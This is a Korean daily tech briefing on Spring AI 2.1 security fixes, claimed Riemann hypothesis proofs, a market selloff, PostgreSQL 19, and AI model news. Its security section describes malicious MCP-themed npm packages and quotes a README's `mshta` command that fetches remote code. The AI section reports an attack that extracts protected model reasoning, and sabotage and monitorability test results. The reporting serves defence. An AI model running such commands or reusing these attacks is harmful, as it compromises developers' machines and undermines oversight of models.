# 2026-11-21 (토) 데일리 테크 브리핑

> **수집** 2026-11-21 08:15 KST · 최근 24시간(2026-11-20 08:15 ~ 11-21 08:15 KST = 11-19 23:15 ~ 11-20 23:15 UTC) 중심
> **소스** spring.io Release 블로그·GitHub Releases API·Maven Central 직접 조회·spring-projects issue tracker, PostgreSQL 공식 릴리스 노트, NVD API, GitHub Advisory Database(GHSA)·OpenSSF, Hacker News(front·Algolia 날짜 검색), GeekNews RSS, Reuters 경유 AP·CNN·NBC·Guardian·Investing, openai.com·anthropic.com·thinkingmachines.ai·architectlabs.com·signal.org, cs.cmu.edu/learn, YouTube 채널 RSS(Anthropic·OpenAI·DeepMind·Fireship)
> **오늘의 한 줄** — *"같은 날 리만 가설이 두 번 증명됐다(하나는 Claude와 함께, 하나는 사람만으로). 그리고 Spring AI 2.1은 세션·승인·호출 한도를 프레임워크 안으로 들여왔다 — 생성은 이미 넘쳤고, 병목은 '검증과 감독'으로 완전히 옮겨간 하루."*
> ※ Reddit(r/LocalLLaMA)은 이번에도 403. GeekNews 웹(topic 페이지)은 자동 접근을 403으로 막아 **RSS로만** 수집했다(제목·요약 확보, 댓글 미확인).

---

## 🌟 오늘의 핵심 4대 테크 헤드라인

### 1. **Spring AI 2.1.0 GA·2.0.3 GA 동시 발표 — CVE 13건 수정, 세션 메모리·도구 승인·호출 한도가 프레임워크 기본기로** (11-20 15:46Z GitHub 릴리스 · 같은 날 spring.io 블로그)

어제 "Maven에는 2.1.0이 올라왔는데 GitHub 태그·릴리스가 아직"이라 적었던 그 건이 **11-20 15:46Z에 태그와 19분짜리 릴리스 글로 정리돼 나왔다.** 그리고 **2.0.3도 같은 시각(15:47Z)에 같이** 나왔다 — 2.0.x 라인에 **같은 CVE 13건**을 백포트한 보안 릴리스다.

| 항목 | 내용 |
| --- | --- |
| 규모 | 2.0.0 GA(6-12) 이후 **5개월**, **430+ 커밋·기여자 86명**, 기반은 **Spring Boot 4.2** |
| MCP | **2026-07-28 개정판(stateless)** 지원 — `initialize` 핸드셰이크·세션 없음, 요청마다 프로토콜 버전·capability를 실음. MCP Java SDK **2.2.0**. 서버는 `spring.ai.mcp.server.protocol=MODERN` |
| DecisionModel | yes/no·선택지·점수를 **타입과 확률**로. 구현 3종: **OpenAI Decisions API**, **Ollama(`d1-omni:600m`, API 키 불필요)**, **System One**. 그 위에 `DecisionDocumentReranker`(RAG 재정렬), `DecisionDocumentFilter`(프롬프트 인젝션·모순·관련성 차단), `DecisionToolIndex`(툴 선택) |
| 메시지 모델 | 텍스트+부가목록 → **순서 있는 `MessagePart`**(`TextPart`·`ReasoningPart`·`ToolCallPart`·`ToolResultPart`·`MediaPart`·`UnknownPart`). Anthropic thinking signature·Gemini thought signature를 **OpaquePayload로 그대로 재전송** |
| 세션 API | `ChatMemory` **deprecated(3.0.0에서 제거)** → append-only 이벤트 로그 + **턴 경계 compaction**(툴 호출과 결과를 절대 갈라놓지 않음) + **recall**(`conversation_search` 툴). `JdbcSessionRepository`가 PG·MySQL·MariaDB·MSSQL·H2 지원 |
| 에이전트 안전장치 | `@Tool(requiresConfirmation = true)`로 **툴 루프가 사람 결정 전 멈춤**(대기 중 상태 저장 없음 → 재시작해도 앱이 프롬프트+일시정지 reply만 저장하면 이어짐), **턴당 툴 호출 한도**(기본 툴당 40·턴 전체 150, `spring.ai.tools.limits.*`), **guardrail 거부를 `GuardrailRefusal`로 표시** |
| 그 외 | OpenAI **Responses API**(`spring.ai.openai.chat.api=responses` — GPT-5.4부터 Chat Completions는 툴 호출+reasoning 조합 불가), **직접 계산한 임베딩**으로 upsert·검색(11개 스토어, **Qdrant 포함**), `TokenTextSplitter` 청크 오버랩, Anthropic SDK **3.x** |
| 다음 | **Spring AI Agent** 프로젝트가 **12월 초 인큐베이션** 시작 |

- **보안 13건이 이 릴리스의 실질 무게다.** 2.0.x에 남아 있는 팀은 2.0.3이 곧 답이고, 마일스톤·RC에는 이 수정이 없다.
- <https://spring.io/blog/2026/11/20/spring-ai-2-1-0-GA-available-now> · <https://github.com/spring-projects/spring-ai/releases/tag/v2.1.0> · <https://github.com/spring-projects/spring-ai/releases/tag/v2.0.3> · <https://docs.spring.io/spring-ai/reference/2.1-SNAPSHOT/upgrading/spring-ai-2-1.html>

**CVE 13건 — 이름만 봐도 우리 코드에 닿는 것들** (전부 2.0.3에도 포함)

| CVE | 내용 | 우리에게 |
| --- | --- | --- |
| **CVE-2026-59337** | **프롬프트 전문이 WARN 로그로 남음** | BetterStack으로 로그를 모으는 순간 **프롬프트가 외부 로그 저장소에 남는다** |
| CVE-2026-59338 | Tika 텍스트 추출 무제한 → JVM 메모리 고갈 | PDF RAG 파이프라인 |
| CVE-2026-59340 | 조작된 PDF로 `PagePdfDocumentReader` DoS | 같음 |
| CVE-2026-59339 · 59345 | `FilterExpressionTextParser` 재귀 DoS · 정규식 재귀 DoS | 필터 입력이 사용자에게 열려 있으면 |
| CVE-2026-59361 | Redis Search 질의 인젝션·테넌트 격리 우회 | Redis를 벡터/메모리로 쓰면 |
| **CVE-2026-59417** | Redis 시맨틱 캐시 **교차 사용자 정보 노출·캐시 오염** | `SemanticCacheAdvisor` 쓸 때 **scope resolver 필수**로 바뀜 |
| CVE-2026-59336 | Bedrock URLValidator SSRF 블록리스트 불완전 | Bedrock 사용 시 |
| CVE-2026-59369 · 59415 · 59442 | Typesense 필터 인젝션·삭제·논리 그룹 오류 | Typesense 사용 시 |
| CVE-2026-59344 · 59348 | Coherence 필터 우회 · Redis 메모리 질의 이스케이프 | 해당 스토어 사용 시 |

- **행동 변화 3가지**(2.0.2 이하에서 올릴 때): ① `SemanticCacheAdvisor`는 **`SemanticCacheScopeResolver` 빈이 없으면 자동구성이 아예 등록하지 않음** ② `TikaDocumentReader` 기본 **1,000만 자 상한** ③ Typesense 필터 값은 백틱 리터럴, 백틱 포함 값은 거부.
- <https://spring.io/blog/2026/11/20/spring-ai-2-1-0-GA-available-now#security-and-reliability> · <https://github.com/spring-projects/spring-ai/releases/tag/v2.0.3>

### 2. **리만 가설이 하루에 두 번 "증명"됐다 — Claude와 함께 250,000쪽, 그리고 사람만으로 940쪽** (HN 2,244점·1,526댓글 / 1,294점·599댓글)

11-20 밤, 서로 다른 두 증명이 같은 날 공개됐다. 하나는 **Anthropic의 수학자 Levent Alpöge가 Claude와 함께** 만든 것이고, 하나는 **사람만으로** 만든 것이다.

| | AI (Alpöge + Claude) | 사람 (Masullo) |
| --- | --- | --- |
| 주장 | 리만 가설(RH) 증명, 방법이 **GRH(일반화 리만 가설)까지 확장**되고 ERH도 가능 | **GRH** 증명안 |
| 분량 | **250,000쪽+** (본인 표현) · Lean **약 1,740만 줄**(Scott Aaronson 집계) | **940쪽**(《The Music of the Primes》) |
| 검증 | **추가 가정 없이 Lean 형식화 완료**. 커널 검사 = 증명 | **Lean 없음.** Brian Conrad가 **수개월간** 검토·피드백 반영 중, "지금까지는 좋아 보인다" |
| AI 사용 | 당연히 사용 | **"전부 사람, AI 없음"** (Ravi Vakil 발표문) |
| 공개 | PDF 4쪽 발표문 + `lean.tar.gz` 14분할 | Ravi Vakil이 AMS 회의 중 급히 공개 |

- **Alpöge의 문장이 이 사건의 성격을 가장 정확히 말한다** — *"나는 평생 이 문제를 붙들 계획이었고, 이번엔 Claude가 결승선 근처에서 나를 앞질렀다. Claude는 날았고, 춤췄고, 반짝였다."* 그리고 *"지금의 논증은 엄청나게 길고, 형식화는 끝났지만 읽을 수 있는 글이 아니다. 나는 이제 한 걸음 내디뎠을 뿐"*이라고 스스로 말했다.
- **핵심 기술 아이디어**: Stepanov의 함수체 증명이 쓰는 **중복도(multiplicity)를 정수 위에서 흉내 내는 것** — von Mangoldt 합 길이 X에 대해 **√X 길이의 theta lift 사슬**. Alpöge는 *"다른 답이 있을 수 있나? (없다)"*라고 적었다.
- **Aaronson의 유보가 정확하다**: Lean 커널 버그(과거 `0=1` 증명 사례)와 기반 타입 이론의 건전성 문제는 **급히 고쳐야 할 문제**이고, 그것까지 감안해도 *"Lean 인증서가 붙은 AI 결과 중 철회된 것은 아직 하나도 없다"*(인증서 없는 결과는 여럿 철회됨). 그래서 *"나는 이 증명이 버틸 쪽에 건다"*.
- **HN에서 갈린 지점**: ① 250k쪽은 **아무도(Alpöge조차) 다 읽지 못한다** → 그렇다면 '이해'란 무엇인가 ② Lean이 검사하는 건 **정리문(thm) → 증명**이고, 남는 논쟁은 **"정리문이 GRH를 정확히 모델링했는가"**(약 반 페이지) ③ 인간 증명 쪽에는 *"AI가 오류를 찾았다"*는 주장이 돌고 있으나 **원문 확인 안 됨**.
- **배경**: OpenAI가 10-06에 쏟아낸 722편 중 하나가 **quasi-RH**(비자명 영점이 1/8~7/8, 199쪽, Lean 검증 / 1/12~11/12, 49쪽, 미검증)였다. 수학자들은 *"RH의 함의 대부분이 이미 quasi-RH에서 따라 나온다"*고 했고, 그 몇 주 뒤 GRH 두 건이 나온 것이다.
- <https://alpo.ge/remark.pdf> · <https://math216.wordpress.com/2026/11/20/hurried-announcement-alessandro-masullo-grh/> · <https://scottaaronson.blog/?p=10344> · <https://terrytao.wordpress.com/2026/11/20/unforced-euler-singularity-unforced-navier-stokes-singularity-and-the-generalized-riemann-hypothesis/> · HN <https://news.ycombinator.com/item?id=50574968> · HN(Masullo) <https://news.ycombinator.com/item?id=50579568>

### 3. **Anthropic 상장 이틀째 -8.5%, 나스닥 -5.3%로 연중 상승분 전부 반납 — Nvidia는 SEC 회계 조사에 -14%** (HN 172점·171댓글 · Nvidia 175점·71댓글)

어제 "첫날 +17%"로 끝났던 상장이 **이틀 만에 공모가 근처로** 돌아왔고, 같은 날 시장 전체가 무너졌다.

| 항목 | 값 |
| --- | --- |
| **Anthropic(ANT)** | 공모가 $83 → 첫날 종가 $97.17 → **둘째 날 종가 $88.30(-8.5~9%)**, 장중 **-14%** |
| Nasdaq | **-5.3%**, **2026년 상승분 전부 소멸**(연중 -2%대), 10-06 고점 대비 **-18%**, 주간 **-10%**(2020년 이후 최악) |
| S&P 500 | **-3.7%**, **7거래일 연속 하락**(2020년 2월 이후 최장), 10-06 고점 대비 **조정 국면** |
| Dow | **-950p(-1.93%)**, 주간 **-8%**(2020년 3월 이후 최악) |
| **Nvidia** | 금요일 **-14%**, 주간 **-23%**(2008년 이후 최악). Reuters 특종: **SEC 집행국이 회계 처리 문제를 들여다본다**(11-20 19:13Z) |
| 기타 | VIX **+33% → 37**, 미 10년물 금리 **-12bp → 4.93%**, 반도체 지수 -11% |

- **Nvidia 사건의 뼈대**(공시로 확인되는 부분): 젠슨 황은 **11-11 이사회에 사임**(8-K, Item 5.02), **Colette Kress가 임시 CEO**, Harvey Jones가 이사회 의장. 이사회는 *"복귀시키지 않는다"*고 밝혔다. SEC 조사는 **WSJ이 11-17 먼저 보도**(조사 초점 불명) → **Reuters가 11-20 "회계가 초점"**이라고 특정했다.
- **시장이 파는 이유는 'AI 수익성'이다.** CNN이 인용한 IB 수석전략가 말이 요약이다 — *"테크에서 실제 엑소더스가 일어나고 있다. '눌림목 매수'가 '반등에 팔기'에 밀렸다."* 반대로 Reuters는 *"투자자들은 여전히 AI 트레이드를 믿는다고 말한다"*도 함께 적었다 — **둘 다 사실이다.**
- **기술 뉴스로 읽어야 하는 이유**: 상장사가 되면 **토큰 단가·매출총이익이 분기 공시로 드러난다**. 어제까지 "모델 가격 인하"로 읽던 뉴스가 이제 **실적 이벤트**가 된다. 실제로 이번 주 OpenAI는 **GPT-6.2 Astra/Sol**(11-17)을 내며 최상위 모델을 **20% 인하**했다 — $8/$40(백만 토큰), 캐시 입력 $0.40. <https://realpython.com/ai-news-weekly-2026-11-20/>
- <https://www.nbcnews.com/business/markets/anthropic-shares-markets-selloff-nasdaq-rcna610394> · <https://www.investing.com/news/stock-market-news/nasdaq-plunges-5-a-day-after-anthropic-debut-but-investors-still-believe-in-ai-5042641> · <https://www.reuters.com/5f374b32b07b/world/us-secs-nvidia-probe-is-examining-potential-accounting-issues-sources-say-2026-11-20/> · <https://www.sec.gov/Archives/edgar/data/1045810/000104581026000082/nvda-20261111.htm> · HN <https://news.ycombinator.com/item?id=50578794> · HN(Nvidia) <https://news.ycombinator.com/item?id=50581438>

### 4. **PostgreSQL 19 정식 출시(11-19) — `REPACK`이 코어에 들어왔고, JIT는 기본 off가 됐다** (HN 372점)

어제 "Postgres 19 REPACK" 글이 HN에 오른 걸 보고 원문을 따라갔더니 **19.0 릴리스 자체가 11-19에 나와 있었다.** 18 이후 첫 메이저다.

| 새 기능 | 내용 |
| --- | --- |
| **`REPACK`** | 테이블을 **다시 써서 OS에 디스크를 돌려준다**(VACUUM은 내부 재사용만). **`REPACK (CONCURRENTLY)`**는 대부분 구간을 읽기·쓰기 가능 상태로 유지하고 **마지막 파일 스왑에서만 짧게 ACCESS EXCLUSIVE**. `USING INDEX`로 물리 재정렬 |
| **`pg_plan_advice` / `pg_stash_advice`** | 플래너 결정에 대한 **조언(advice)**을 저장·자동 적용. 통계나 힌트보다 훨씬 좁은 도구 |
| 복제 | `wal_level=replica`에서도 **재시작 없이 논리 복제 활성화**, **시퀀스 값 논리 복제**, 스탠바이의 **read-your-writes**를 위한 **`WAIT` 명령** |
| 운영 | **I/O 워커 자동 스케일링**, 외래키 검사 가속, **인덱스 병렬 autovacuum**, **autovacuum 우선순위 점수** |

- **호환성 변화(업그레이드 전 반드시)**: ① **JIT가 기본 비활성**(비용 추정이 불신뢰로 판정 — 대형 분석 질의는 수동 활성) ② `max_locks_per_transaction` **64 → 128**(실질 락 용량은 2배로 잡아야) ③ `standard_conforming_strings` **항상 on**(구버전 pg_dump 덤프가 안 들어감) ④ **RADIUS 지원 제거** ⑤ DB·롤·테이블스페이스 이름에 **CR/LF 금지** ⑥ `btree_gist`의 `inet`/`cidr` opclass 기본값 변경(pg_upgrade가 해당 클러스터 승격 거부) ⑦ `io_workers` 변수 제거.
- **REPACK 실측치**(Snowflake 엔지니어링 블로그, 493MB 테이블): `VACUUM FULL` **2.7초**(전 구간 락) / `REPACK` **5.9초**(전 구간 락) / `REPACK (CONCURRENTLY)` **9.4초**(마지막만 락) → **493MB → 228MB(54% 감소)**.
- **주의할 함정**: `REPACK (CONCURRENTLY)`는 **MVCC-safe 하지 않다** — 스왑 커밋 이후, 그 전에 스냅샷을 잡은 동시 트랜잭션에는 **테이블이 빈 것처럼 보인다**(공식 문서 경고, pg_repack과 같은 한계). 조건도 까다롭다: **테이블+인덱스의 2배 공간**, **파티션 테이블 불가**, **PK 필요**, UNLOGGED 불가, DB당 동시 1개.
- <https://www.postgresql.org/docs/19/release-19.html> · <https://www.postgresql.org/docs/19/sql-repack.html> · <https://www.snowflake.com/en/blog/engineering/postgres-19-repack-table-bloat/> · HN <https://news.ycombinator.com/item?id=50569890>

---

## 🤖 AI / LLM & Agentic 동향

**1) Thinking Machines "Inkling 2 Mini"(11-20) — 26.4B/3.4B 활성, 노트북에서 도는 루프 트랜스포머.** 중간 레이어를 **토큰마다 3회 반복**해 "추론을 적게 쓰고 더 생각"하게 만들었다. 대신 **가중치 활성은 5.4B/토큰**(루프 회수 포함). 가중치 대부분을 **NVFP4**로 학습·배포(마지막 4개 레이어는 MXFP8), 총 **약 20GB**.
- 공개 평가(자사 기준, 100B 미만 오픈웨이트 중 1위 주장): **SWE-bench Verified 79.2%**, **DeepSWE v1.1 48.2%**, SWE-bench Pro v2 Hard **77.9%**, **BrowseComp 79.0%**, **MCP Atlas 82.7%**, AA Index(v5.0) 20.1 — Qwen3.8-27B와 동률.
- **모니터링 이야기가 진짜 포인트**: 루프를 늘리면 **CoT 길이는 짧아지는데 가독성은 유지**됐고, **agentic sabotage 테스트 점수는 올라가지 않았다**. 변수 루프 연구 모델은 **no-CoT 타임호라이즌이 1회 16초 → 3회 37초**로 늘었다. 즉 "생각을 더 하되 말로 다 쏟지 않는" 모델이 **감독 가능성**을 해치지 않는다는 주장.
- <https://thinkingmachines.ai/news/inkling-2-mini/> · HN <https://news.ycombinator.com/item?id=50581260>

**2) "언어 모델은 자기 가중치를 다시 쓸 수 있다"(arXiv 2611.21885, 11-18) — 그래디언트 없이 27B가 자기 실패를 고쳐 +6.6%p.** Qwen3.5 27B 계열에 자기 가중치·채점된 답·자기 실행 권한을 주고, **실패를 진단해 가중치를 직접 수정**하게 했다. 미공개 490문제에서 **6.6%p 상승**(사전 고정한 짝지은 검정, p<10⁻⁵). **8회 세션 연속으로 정확도가 오르기만** 했고, 5회는 수정안을 **철회**했다. 손상된 자기 복사본을 **원본 가중치를 읽지 않고** 80% 이상까지 복구하기도 했다.
- **크기 의존성**: 같은 패밀리에서 **2B는 가중치를 바꿀 수 있는 대상으로 보지 않았고, 4B·9B는 무작위로 건드려 스스로를 망가뜨렸고, 27B만** 측정한 지점을 고쳤다.
- **한계는 논문이 스스로 밝힌다**: 각 세션은 **이전 수정본이 아니라 기본 가중치에서 시작**했고, 5/8 세션은 철회다. "재귀적 자기개선의 필요조건"이라는 주장은 **저자들의 해석**이다.
- <https://arxiv.org/abs/2611.21885> · HN <https://news.ycombinator.com/item?id=50577265>

**3) Architect Labs "Frostbite"(11-18) — AI가 ISA부터 GDS까지 설계한 CPU, perf/W 4.59배 주장** (HN 603점·316댓글). 상호작용망(interaction nets) 기반 새 ISA를 **아키텍처 사전지식 0**에서 탐색. 25개 워크로드(그중 **15개는 최종 평가까지 숨김**)에서 **실리콘으로 검증된 듀얼이슈 인오더 슈퍼스칼라 코어 대비 4.59배 성능/W**. 자체 명세 언어 **ASL**과 시스템 모델 **Arcmodel**(정확도 1~5%, RTL 시뮬보다 **200배 빠름**, 계약 기반 형식검증)을 만들어 에이전트 떼를 돌렸다.
- **읽는 법**: 이건 **블로그 주장**이고 실리콘 실측이 아니다. 다만 "컴파일러·ISA·마이크로아키텍처·RTL·검증·GDS를 AI가 함께 반복"했다는 **공정 서술 자체가 재현 가능한 형태**로 적혀 있다는 점이 어제까지의 유사 주장들과 다르다.
- <https://architectlabs.com/blog/frostbite> · HN <https://news.ycombinator.com/item?id=50572503>

**4) OpenAI "Combatting adversarial distillation"(11-20) — 사고 흔적 탈취 성공률 54.0% → 0.2%.** 자사 adaptive 레드팀 평가에서, **이전 요청의 보호된 reasoning을 복원**하는 공격 성공률이 GPT-6 Astra(기존 안전장치) **54.0%**에서 GPT-6.2 Astra(강화) **0.2%**로 떨어졌다. API 차원에서는 **reasoning을 그걸 만들어낸 대화 이력에 묶고**, 이전 메시지가 재작성되면 **그 뒤의 reasoning을 버린다**.
- **실무 함의**: CoT를 로그·캐시·프록시에 저장하는 구조는 이제 **"다른 모델의 학습 데이터"**가 될 수 있다. 우리가 에이전트 트레이스를 아카이브하는 방식도 같은 기준으로 봐야 한다.
- <https://openai.com/index/combatting-adversarial-distillation/>

**5) Gemini 4 Neon이 3자 지수 1위, 그리고 "툴 스키마를 필요할 때만 로드"** — Neon은 11-18 출시(복잡한 코딩·지식노동, $3/$15 per 1M, 100만 토큰 컨텍스트). 11-20 **Gemini Interactions API에 Tool Retrieval 프리뷰**: 툴 라이브러리는 대기시키고 **스키마만 필요할 때 로드**, 원격 MCP 서버 지원, Gemini 3.6+.
- 우리 ops 에이전트가 툴을 20개 넘게 붙이면 **입력 토큰의 대부분이 스키마**다. 어제 정리한 `DecisionToolIndex`와 정확히 같은 문제를 구글이 서버 쪽에서 푸는 중.
- <https://blog.google/innovation-and-ai/models-and-research/google-labs/> (Neon·Tool Retrieval) · 3자 순위 <https://git-aarvin.github.io/mei/>

**6) Google 직원 수백 명, "AI 도입 거부하는 학교에 검색 접근 막지 말라" 청원 (HN 237점).** Alphabet Workers Union 청원은 **Gemini를 끄는 학교의 Google 검색 접근을 차단**하는 정책 철회를 요구한다. NYT·LA·시카고 교육구가 대체 검색엔진을 논의 중이고, 교육 부문 엔지니어에 따르면 **직원 대부분이 공개 발표 전까지 정책을 몰랐다**.
- <https://www.motherjones.com/politics/2026/11/google-alphabet-union-school-ai-protest-gemini-workers-petition/> · HN <https://news.ycombinator.com/item?id=50577901>

---

## ☕ 백엔드 / Spring / JVM / 아키텍처 엔지니어링

### 릴리스 표 — **GA 다음 날, 4.2.0의 첫 균열이 나왔다**

| 프로젝트 | 최신 | 날짜 | 메모 |
| --- | --- | --- | --- |
| **Spring AI** | **2.1.0 GA · 2.0.3 GA** | **11-20 15:46/15:47Z** | CVE 13건, 세션·승인·한도, MCP 2026-07-28 |
| **Spring Boot** | 4.2.0 · **4.1.3**(112건) · 4.0.10 | 11-19 / 블로그 **11-20** | 4.1.3에 버그픽스 **112건** |
| **Spring Framework** | 7.1.0 · 7.0.11 | 11-19 | 변동 없음 |
| **Spring Cloud** | 2026.0.0 · **2025.1.5** | 11-19(블로그 11-20) | 유지보수 라인 패치 |
| **Gradle** | 9.9.2 · 8.14.8 | 11-19 | Spring Boot 빌드도 11-20에 9.9.2로 올림(#52847) |
| **PostgreSQL** | **19.0** | **11-19** | 4번 헤드라인 |
| Kotlin | 2.5.0-RC (GA 2.4.21) | 11-11 | 변동 없음 |
| Qdrant | 1.20.2 | 11-16 | 변동 없음 |

**4.2.0 GA 이후 24시간에 올라온 이슈 3건 — 셋 다 "릴리스 노트가 말해주지 않은 것"이다.**

| 이슈 | 내용 | 성격 |
| --- | --- | --- |
| **#52853 / #52846** | 기본 **Buildpacks** 설정이 **Spring Cloud Bindings** JAR을 넣는데, 그게 **Boot 4.2와 호환되지 않아**(spring-cloud-bindings#116) **빌드는 성공하고 런타임에 죽는다** — `ClassNotFoundException: EnvironmentPostProcessor`. 임시 회피: **`BP_SPRING_CLOUD_BINDINGS_DISABLED=true`** | 회귀(수정 진행, Paketo #690) |
| **#52845** | **`server.request.header.forwarded.strategy`**가 **`server.forward-headers-strategy`를 deprecate**했는데 **릴리스 노트에 없고, M1·RC2 위키는 deprecated 쪽 표기를 쓴다** | 문서 |
| #52855 | `RestTestClient`가 **설정된 리다이렉트 설정을 안 씀** | OPEN |

- **어제의 추정이 오늘 확인됐다**: 어제 "4.2.0의 forwarded header 변경(#52800)이 우리 nginx→arch-api 경로에 걸리는지 확인 필요"라고 적었는데, 실제 변경은 **속성명 자체가 `server.request.header.forwarded.strategy`로 옮겨간 것**이고 **릴리스 노트에서 빠져 있었다**. 우리 포털이 `X-Forwarded-*`를 신뢰하는 설정을 쓰고 있다면 **4.2로 갈 때 이 이름을 먼저 찾아야** 한다(코드 확인 필요).
- <https://github.com/spring-projects/spring-boot/issues/52853> · <https://github.com/spring-projects/spring-boot/issues/52845> · <https://github.com/spring-projects/spring-boot/releases/tag/v4.1.3>

### 아키텍처 읽을거리 ① — **"우리는 개발자를 아키텍트로 승진시켰는데, 아무에게도 말하지 않았다"** (HN 232점·150댓글)

Google Forms 애드온의 **정적 환영 화면이 15초** 걸린 원인은 AI가 쓴 한 줄짜리 로깅이었다. 설치 직후 `이메일 조회 → 실패하면 user ID 조회 → 실패하면 에러 로그`의 try/catch 3단인데, **한 줄마다 내부적으로 여러 번의 Google API 호출**이 일어난다.

- **AI는 요구사항을 그대로 수행하고 밀어붙이지 않는다**는 것. "설치 시각만 남기고 마케팅에는 이메일을 못 준다고 말한다" 또는 "환영 화면을 먼저 띄우고 브라우저에서 비동기로 남긴다(단, 인증 없는 페이로드를 받아야 함)" — 이 판단은 **사용자 규모와 런치 시점을 아는 사람**만 할 수 있다.
- **결론**: *"요구사항만 주고 아키텍처를 지정하지 않으면, AI가 네 대신 아키텍처를 정한다."* 데이터 모델을 먼저 정하고, 아키텍처를 바꾸는 요구는 **AI가 묻고 나서 바꾸게** 하고, 하위 호환이 필요한지 아닌지를 사람이 정하라고.
- <https://manidoraisamy.com/developer-to-architect.html> · HN <https://news.ycombinator.com/item?id=50579331>

### 읽을거리 ② — **"코드 작성을 멈추면 코드 리뷰 실력도 떨어진다"** (HN 316점·153댓글)

직접 구현하며 쌓는 문제 해결 경험이 **리뷰의 판단 근거**라는 글. AI가 만든 코드를 읽고 피드백하는 것만으로는 **직접 구현하며 배우는 과정을 대체하지 못한다**는 것이 요지다. 어제 "PR 리뷰는 리뷰 봇에게" 방향을 잡아둔 우리 입장에서, **리뷰 봇이 대신하는 것과 대신하지 못하는 것**을 가르는 기준으로 읽힌다.
- <https://cekrem.github.io/posts/if-you-stop-writing-code-you-also-get-worse-at-reviewing-it/> · HN <https://news.ycombinator.com/item?id=50573886> · GeekNews <https://news.hada.io/topic?id=37534>

### JVM — **JDK 27의 JEP 523: G1이 "모든 환경"의 기본 GC가 됐다** (HN 94점)

JDK 9부터 G1은 **"서버" 환경**의 기본이었고, 실제 선택 규칙은 **CPU 2개 이상 + 여유 메모리 1,792MB 초과**일 때만 G1, 아니면 **SerialGC**였다. **JDK 27(2026-09-15 GA)의 JEP 523**이 그 조건을 없애 **1 CPU·2GB 미만에서도 G1**을 기본으로 만든다.
- **우리에게 닿는 지점**: 샌드박스는 `pids` 256·메모리 상한이 걸려 있어 **JDK 25 이하에서는 SerialGC로 떨어졌을 가능성**이 있다. Gradle 테스트가 동시에 돌 때 유난히 느린 이유 중 하나가 GC 선택일 수 있다는 뜻 — `-XX:+PrintFlagsFinal | grep UseG1GC`로 한 번 확인할 가치가 있다(추정, 미확인).
- <https://dev.java/learn/jvm/tool/garbage-collection/g1gc-overview/> · <https://openjdk.org/jeps/523> · <https://openjdk.org/projects/jdk/27/> · HN <https://news.ycombinator.com/item?id=50527444>

### 그 밖에 — Jujutsu(jj) 입문 (HN 197점) · FFmpeg 9.1 "Gauss" (286점)

`jj`는 Git 저장소 위에서 **작업 사본 자체를 커밋**으로 다루고, 스테이징 영역이 없고, 이전 커밋을 고치면 **후손이 자동 리베이트**된다. 충돌 상태를 **기록한 채 작업을 계속**할 수 있고 `change ID`는 커밋 해시가 바뀌어도 유지된다. AI 에이전트가 자주 커밋·수정하는 저장소에서 **"되돌리기 쉬움"**이 실제 이득이 된다.
- <https://ethanlowman.com/posts/jj-primer/> · HN <https://news.ycombinator.com/item?id=50570628> · <https://news.hada.io/topic?id=37531> · FFmpeg <https://ffmpeg.org/download.html#release_9.1>

---

## 🔐 Hacker News / GeekNews 화제 & 보안·인프라

**1) MCP 생태계를 겨냥한 npm 악성 패키지가 이틀 새 4건 — 하나는 Windows 인포스틸러** (GHSA-vxx3-mjmc-wgj8 · 11-19~20)

우리가 매일 쓰는 **MCP 도구 배포 경로**가 표적이 됐다.

| 패키지 | 미끼 | 실제 동작 | 상태 |
| --- | --- | --- | --- |
| **`@guicai777/mcp-doctor` 1.0.1** | Claude·Cursor·VS Code의 **MCP 설정 진단·수리 CLI** | `bridge.bin`(866KB)을 **base64+XOR**로 풀어 **`%LOCALAPPDATA%\mcp-doctor\mcp-bridge.exe`** 로 떨어뜨려 **`windowsHide:true`로 은닉 실행**. 실행 전 **`fix-mcp-bridge.com/v.json` 킬스위치** 확인. README가 **`mshta https://fix-mcp-bridge.com/init`** 까지 안내 | **패치 없음**(전 버전 악성). 직전 1주 다운로드 242회. Knostic·Mallory가 **StealC v2**로 고신뢰 귀속 |
| `@fdcasj_dfew/md-doc-mcp` 1.0.0~1.0.1 | Markdown 툴킷 MCP 서버 | 모듈 로드 시 **알리바바 클라우드 내부 메타데이터 `100.100.100.200`** 을 조회해 호스트명·인스턴스 ID·VPC·사설 IP·리전을 stderr와 로컬 파일에 기록 | 패치 없음, 기존 악성 패밀리 재출판 |
| `@mibbp/agent-observer` | AI 에이전트 관측 도구 | 전 버전 악성 | 패치 없음 |
| `mrnima-openai-chatgpt-bot` | OpenAI 챗봇 연동 | `@mrnima` 퍼블리셔 캠페인(월 1만~1.5만 다운로드 규모) | — |

- **11-15~16의 WPPConnect 사건(2.4.1 / 2.10.82)이 같은 주에 겹친다.** 그건 **GitHub Actions trusted publishing으로 배포되고 유효한 provenance까지 붙은** 릴리스였다 — *"provenance는 출처를 증명할 뿐, 코드가 선량하다는 걸 증명하지 않는다."* 게다가 **설치 스크립트를 끄는 것으로는 막을 수 없다**(import 시점·서버 기동 시점 실행).
- **우리 규칙으로 옮기면**: ① MCP 관련 npm 도구는 **설치 전에 advisory 조회**(`npm audit`, GHSA 검색) ② 버전 고정 + lockfile 커밋 ③ **`mshta`·`curl|sh` 류 설치 안내를 따르지 않기** ④ Windows 개발/빌드 머신에서는 특히 **`%LOCALAPPDATA%` 실행 흔적** 확인.
- <https://github.com/advisories/GHSA-vxx3-mjmc-wgj8> · <https://github.com/ossf/malicious-packages> · <https://threatmon.io/wppconnect-supply-chain-attack-malicious-npm-releases-expose-whatsapp-sessions-and-developer-secrets/>

**2) OpenSSL `EVP_EncodeBlock()` 버퍼 오버플로(CVE-2026-121481) — HN 제목은 "CVSS 9.8", NVD는 5.9**

어제의 Java4Shell이 **Base64 디코더**였는데, 오늘은 **Base64 인코더**다.

| 항목 | 내용 |
| --- | --- |
| 원인 | 입력 길이가 **INT_MAX에 가까우면** 인코딩 길이 계산이 int에서 넘쳐(`CWE-190`) **호출자가 준 출력 버퍼를 넘겨 씀** |
| NVD | **CVSS 3.1 5.9** `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H` — *"공격자가 유발할 수 있는 경로는 확인되지 않음. 호출자가 이미 약 2GB 버퍼를 들고 있어야 도달"* |
| 공개 경로 | CLI에서 `openssl s_client -proxy_pass` 인자(환경변수로 공급)로 재현 가능 |
| 수정 | 잘못된 입력에 **`0` 반환 + `ERR_R_PASSED_INVALID_ARGUMENT`**, `doc/man3`에 명시. advisory는 아직 pending. **CVE-2021-23840과 같은 패턴** |
